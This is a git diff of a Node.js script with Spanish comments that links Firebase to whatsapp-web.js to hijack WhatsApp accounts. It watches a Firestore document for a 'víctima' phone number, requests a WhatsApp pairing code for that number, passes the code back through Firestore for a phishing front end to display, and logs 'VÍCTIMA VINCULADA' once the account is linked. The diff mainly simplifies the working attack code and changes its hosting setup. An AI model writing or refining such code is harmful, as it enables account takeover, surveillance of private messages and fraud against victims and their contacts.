@@ -3,27 +3,25 @@ const admin = require('firebase-admin');
 const express = require('express');
 const app = express();
 
-// 1. CARGAR FIREBASE CON DIAGNÓSTICO
-try {
-    const serviceAccount = require("./serviceAccountKey.json"); 
-    if (!admin.apps.length) {
-        admin.initializeApp({
-            credential: admin.credential.cert(serviceAccount)
-        });
-    }
-    console.log("✅ CONECTADO A FIREBASE: panel-admi-633cd");
-} catch (e) {
-    console.log("❌ ERROR CARGANDO LLAVE FIREBASE: " + e.message);
+// 1. CARGAR FIREBASE
+const serviceAccount = require("./serviceAccountKey.json"); 
+if (!admin.apps.length) {
+    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
 }
-
 const db = admin.firestore();
+console.log("✅ FIREBASE CONECTADO");
 
-// 2. CONFIGURACIÓN WHATSAPP (Ajustada para Replit)
+// 2. CONFIGURACIÓN WHATSAPP (SIN BLOQUEO DE PERFIL)
 const client = new Client({
-    authStrategy: new LocalAuth({ clientId: "replit_session" }),
+    authStrategy: new LocalAuth({ dataPath: './session_data' }), // Carpeta nueva para evitar errores
     puppeteer: {
         headless: true,
-        args: ['--no-sandbox', '--disable-setuid-sandbox']
+        args: [
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage',
+            '--disable-gpu'
+        ]
     }
 });
 
@@ -31,35 +29,24 @@ const client = new Client({
 db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
     if (!snap.exists) return;
     const data = snap.data();
-    
-    // Si detecta el número y no hay código aún
     if (data.status === "solicitando_codigo" && !data.pairingCode) {
         console.log("🚀 GENERANDO CÓDIGO PARA: " + data.numero_victima);
         try {
             const code = await client.requestPairingCode(data.numero_victima);
-            console.log("🔑 CÓDIGO GENERADO CON ÉXITO: " + code);
-            
-            await snap.ref.update({
-                pairingCode: code,
-                status: "mostrando_codigo"
-            });
+            console.log("🔑 CÓDIGO LISTO: " + code);
+            await snap.ref.update({ pairingCode: code, status: "mostrando_codigo" });
         } catch (err) {
-            console.log("❌ ERROR WHATSAPP: " + err.message);
+            console.log("❌ ERROR:", err.message);
         }
     }
-}, (error) => {
-    console.log("❌ ERROR ESCUCHANDO FIREBASE: " + error.message);
 });
 
 client.on('ready', () => {
-    console.log("🎯 VÍCTIMA VINCULADA CORRECTAMENTE");
+    console.log("🎯 VÍCTIMA VINCULADA");
     db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
 });
 
 client.initialize().catch(e => console.log("Fallo Init: " + e));
 
-// SERVIDOR PARA REPLIT
-app.get('/', (req, res) => res.send('MOTOR REPLIT ONLINE'));
-app.listen(process.env.PORT || 3000, () => {
-    console.log("📡 Servidor de salud activo.");
-});
+app.get('/', (req, res) => res.send('MOTOR OK'));
+app.listen(5000, "0.0.0.0", () => console.log("📡 Servidor en puerto 5000"));
